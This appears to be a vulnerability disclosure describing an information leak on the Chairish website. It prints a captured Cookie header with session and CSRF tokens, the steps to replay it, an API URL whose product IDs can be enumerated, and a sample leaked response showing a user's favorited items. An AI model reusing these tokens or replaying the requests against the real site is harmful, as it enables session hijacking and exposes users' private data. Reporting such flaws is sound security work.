# About Chairish Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie:_ga=GA1.1.1690917666.1712139383; _gcl_au=1.1.181369209.1712139383; _svsid=08f96362e41166b9c200319b1fd5d855; _fbp=fb.1.1712139383644.1516314480; _pin_unauth=dWlkPU1HVTFaalptTW1RdE5XVTFZeTAwTlRoa0xXRTVNV1F0TnpJME1HRXdNREUxTjJFMg; __attentive_id=edd29684a57641cfafeda12fddf7c948; __attentive_cco=1712139385197; _attn_=eyJ1Ijoie1wiY29cIjoxNzEyMTM5Mzg1MjQ0LFwidW9cIjoxNzEyMTM5Mzg1MjQ0LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImVkZDI5Njg0YTU3NjQxY2ZhZmVkYTEyZmRkZjdjOTQ4XCJ9In0=; __attentive_ss_referrer=https://www.chairish.com/; __attentive_dv=1; csrftoken=k0oM9dFOK82Z330P1RvcfAtxWobL06ZT; sessionid=q3a7zq65hvqklg1fm53st5m0b9wzka22; guid=jleeuc; _uetsid=38ef2930f1a311eeb0ef6ff48e99f762; _uetvid=38ef2200f1a311ee87bb8d463e6aa81d; __attentive_client_user_id=jleeuc; __attentive_pv=2; PLPopupClosed=1; _ga_2N8GB7SB99=GS1.1.1712139382.1.1.1712139410.0.0.0; cpc=1; amplitude_id_1d2656bc9b05970f4174110ee401a478chairish.com=eyJkZXZpY2VJZCI6IjcxNjAxMGZkLTQxYjAtNDNmZC04YTAxLTVlYTBmNjAxMDcwMFIiLCJ1c2VySWQiOiJqbGVldWMiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE3MTIxMzkzODIzNTEsImxhc3RFdmVudFRpbWUiOjE3MTIxMzk0MTE2NTUsImV2ZW50SWQiOjEyLCJpZGVudGlmeUlkIjo0LCJzZXF1ZW5jZU51bWJlciI6MTZ9; MCEvilPopupClosed=1
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: Product Collection Information.

> Request method: GET, information can be obtained by traversing the constructed Product ids,such as "3611090","2C4757355","2C4068476"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params |
|------|---|-|
| shhix|https://www.chairish.com/product/action-info?product_ids=3611090%2C4068476%2C4757355%2C13637478%2C13100959%2C15160373%2C15203492|product_ids=3611090%2C4068476%2C4757355%2C13637478%2C13100959%2C15160373%2C15203492|



### Leaked packet cases 
``` 
{
    "action_info": [
        {
            "id": 3611090,
            "is_favorited": true,
            "is_in_folder": false
        },
        {
            "id": 4068476,
            "is_favorited": true,
            "is_in_folder": false
        },
        {
            "id": 4757355,
            "is_favorited": false,
            "is_in_folder": false
        },
        {
            "id": 13637478,
            "is_favorited": true,
            "is_in_folder": false
        },
        {
            "id": 13100959,
            "is_favorited": true,
            "is_in_folder": false
        },
        {
            "id": 15160373,
            "is_favorited": true,
            "is_in_folder": false
        },
        {
            "id": 15203492,
            "is_favorited": true,
            "is_in_folder": false
        }
    ]
}

```